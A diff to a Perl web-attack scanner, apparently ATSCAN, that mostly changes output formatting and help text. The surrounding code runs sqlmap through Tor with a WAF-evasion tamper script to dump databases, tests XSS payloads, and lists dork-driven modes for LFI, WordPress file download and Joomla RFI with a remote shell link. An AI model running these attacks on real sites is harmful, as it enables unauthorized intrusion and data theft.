@@ -1521,12 +1521,12 @@ sub mLXss  {
       my $html = $response->content;
 	  
 	  print color 'bold yellow';
-	  print "[+] EXPL:   ";
+	  print "  [+] EXPL:   ";
 	  print color RESET;
       print "$XSS \n";
 		
 	  print color 'bold yellow';
-	  print "[+] VULN:   ";
+	  print "  [+] VULN:   ";
 	  print color RESET;
 
 	  if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
@@ -1579,12 +1579,12 @@ sub mtXss{
     $response = $ua->request($request);
     my $html = $response->content;
 	  print color 'bold yellow';
-	  print "[+] EXPL:   ";
+	  print "  [+] EXPL:   ";
 	  print color RESET;
       print "$XSS \n";
 		
 	  print color 'bold yellow';
-	  print "[+] VULN:   ";
+	  print "  [+] VULN:   ";
 	  print color RESET;
 	
     if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
@@ -1626,9 +1626,8 @@ sub sqlmaptor {
 
     print color 'yellow';
     print "[+] Checking databases...\n";
-	sleep(2);
     print color RESET;
-	
+	forwait();
     system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		  
 	### BEG DATABASE
 	DATABASE:; 
@@ -1737,7 +1736,7 @@ sub sqlmap {
 
     print color 'yellow';
     print "[+] Checking databases...\n";
-	sleep(2);
+	forwait();
     print color RESET;
     system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 		
@@ -2488,6 +2487,7 @@ sub mlsubdomain {
     scandetail();
   }
   countargets();
+
   open (TEXT, $listname);
   while (my $Target = <TEXT>) {
 	chomp $Target;
@@ -3730,6 +3730,7 @@ sub mzipsites {
         next if $seen{$_} > 1;
         print;
         close (TEXT);
+
 	    unlink "Zip_server_files_Scan.txt.bac";
 	    unlink "Server_sites_Scan.txt";
 	  }
@@ -3887,8 +3888,6 @@ sub help {
   print "     --ports:    | scan server ports \n";
   print "     --start:    | start scan port \n";
   print "     --end:      | end scan port \n";
-  print "     --tcp:      | tcp ports \n";
-  print "     --udp:      | udp ports \n";
   print "     --all:      | complete mode \n";
   print "     --basic:    | basic mode \n";
   print "     --select:   | Select mode you can set rang of ports \n";
@@ -3903,7 +3902,6 @@ sub help {
   print "     --decode64: | decode base64 string \n";
   print "     --isup:     | check http status 200. \n";
   print "     --httpd:    | print site httpd version \n\n";
- 
   print "     --update:   | check tool version \n\n";
   print "     --replaceme:| string to replace \n\n";
   print "     --withme:   | string to replace with \n\n";
@@ -3932,19 +3930,15 @@ sub help {
   print color 'bold';
   print "     Validation: \n";
   print color RESET;
-  print "       Xss: --dork <dork/dork.txt> --level <1> --xss --valid <txt>\n";
-  print "       Lfi: --dork <dork/dork.txt> --level <1> --lfi --valid <txt> \n";
-  print "       Xss: --dork <dork/dork.txt> --level <1> --xss --isup\n";
-  print "       Lfi: --dork <dork/dork.txt> --level <1> --lfi --isup \n";
+  print "       Xss: --dork <dork/dork.txt> --level <1> --exp --isup\n";
+  print "       Lfi: --dork <dork/dork.txt> --level <1> --exp --isup \n";
   print color 'bold';
   print "     Use List / Target: \n";
   print color RESET;
   print "       Xss: -t <target> --xss\n";
   print "       Lfi: -l <target> --lfi \n";
-  print "       Xss + Validation: -t <target> --xss --valid <txt>\n";
-  print "       Lfi + Validation: -t <target> --lfi --valid <txt> \n";
-  print "       Xss + Validation: -l <list.txt> --xss --isup\n";
-  print "       Lfi + Validation: -l <list.txt> --lfi --isup \n";
+  print "       Validation: -t <target> --exp --valid <txt>\n";
+  print "       Validation: -l <list.txt> --exp --isup\n";
   print "       Find admin page: -t <target> --admin\n";
   print "       Find subdomains: -t <target> --shost\n";
   print color 'bold';
@@ -3957,15 +3951,15 @@ sub help {
   print "       Get Server zip sites files: -t <ip> --level <value> --zip \n";
   print "       WP Arbitry File Download: -t <ip> --level <value> --wpadf \n";
   print "       Joomla RFI: -t <ip> --level <1> --joomfri --shell <shell link>\n";
-  print "       Scan basic tcp (quick): -t <ip> --ports --basic --tcp\n";
-  print "       Scan basic udp basic (quick): -t <ip> --ports --basic --udp\n";
-  print "       Scan basic udp+tcp: -t <ip> --ports --basic --udp --tcp\n";
-  print "       Scan complete tcp: -t <ip> --ports --all --tcp\n";
-  print "       Scan complete udp: -t <ip> --ports --all --udp\n";
-  print "       Scan complete tcp+udp: -t <ip> --ports --all --udp --tcp\n";
-  print "       Scan rang tcp: -t <ip> --ports --select --start --end --tcp\n";
-  print "       Scan rang udp: -t <ip> --ports --select --start --end --udp\n";
-  print "       Scan rang udp + tcp: -t <ip> --ports --select --start <value> --end <value> --udp --tcp\n";
+  print "       Scan basic tcp (quick): -t <ip> --ports --basic tcp\n";
+  print "       Scan basic udp basic (quick): -t <ip> --ports --basic udp\n";
+  print "       Scan basic udp+tcp: -t <ip> --ports --basic udp+tcp\n";
+  print "       Scan complete tcp: -t <ip> --ports --all tcp\n";
+  print "       Scan complete udp: -t <ip> --ports --all udp\n";
+  print "       Scan complete udp+tcp: -t <ip> --ports --all udp+tcp\n";
+  print "       Scan rang tcp: -t <ip> --ports --select --start <value> --end <value> tcp\n";
+  print "       Scan rang udp: -t <ip> --ports --select --start <value> --end <value> udp\n";
+  print "       Scan rang udp + tcp: -t <ip> --ports --select --start <value> --end <value> udp+tcp\n";
   print color 'bold';
   print "     Encode / Decode: \n";
   print color RESET;
